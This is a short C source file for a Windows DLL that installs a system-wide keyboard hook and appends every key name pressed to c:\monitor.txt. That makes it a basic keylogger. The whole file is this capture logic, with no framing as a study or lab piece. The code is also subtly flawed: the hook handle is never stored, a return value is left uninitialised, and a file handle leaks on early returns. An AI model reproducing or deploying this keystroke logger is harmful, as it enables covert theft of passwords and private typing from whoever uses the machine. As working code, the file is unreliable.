#define _CRT_SECURE_NO_WARNINGS
#include "KeyboardHook.h"





#include <stdio.h>


BOOL WINAPI SetKeyHook(BOOL bInstall)
{
	BOOL bOk;
	if (bInstall)
	{
		SetWindowsHookEx(WH_KEYBOARD, KeyHookProc, GetModuleHandle(L"KeyboardHook"), 0);
		bOk = (g_hHook != NULL);
	}
	else
	{
		UnhookWindowsHookEx(g_hHook);
		g_hHook = NULL;
	}
	return bOk;
}

LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	char szKey[80] = { 0 };
	FILE *fp = fopen("c:\\monitor.txt", "a+");
	if (nCode < 0 || nCode == HC_NOREMOVE)
	{
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}
	if (lParam & 0x40000000)
	{
		return CallNextHookEx(g_hHook, nCode, wParam, lParam);
	}

	GetKeyNameTextA(lParam, szKey, 80);

	fwrite(szKey, strlen(szKey), 1, fp);
	fputs("\r\n", fp);
	fclose(fp);

	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

